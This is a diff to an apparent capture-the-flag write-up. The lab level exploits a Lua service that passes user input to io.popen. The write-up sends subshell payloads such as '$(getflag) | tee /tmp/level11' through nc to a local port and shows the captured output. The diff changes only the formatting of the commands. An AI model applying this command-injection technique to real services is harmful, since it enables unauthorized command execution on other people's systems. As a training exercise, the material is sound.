@@ -69,15 +69,17 @@ io.popen("echo "..pass.." | sha1sum", "r")
 So by sending a subshell, we should be able to execute a command. But since everything is piped to a `sha1sum` command, we need to find a way to write in a file the result. That why `tee` is used: it can write the input it gets to a file and to the standard output. After that, we can simply read what he wrote in the file.
 
 ```bash
-$ echo '$(id) | tee /tmp/level11' | nc 127.0.0.1 5151 && cat /tmp/level11
+$ echo '$(id) | tee /tmp/level11' | nc 127.0.0.1 5151
 Password: Erf nope..
+$ cat /tmp/level11
 uid=3011(flag11) gid=3011(flag11) groups=3011(flag11),1001(flag)
 ```
 
 Confirmed! Now the `getflag` command:
 
 ```bash
-$ echo '$(getflag) | tee /tmp/level11' | nc 127.0.0.1 5151 && cat /tmp/level11
+$ echo '$(getflag) | tee /tmp/level11' | nc 127.0.0.1 5151
 Password: Erf nope..
+$ cat /tmp/level11
 Check flag.Here is your token : ....
 ```
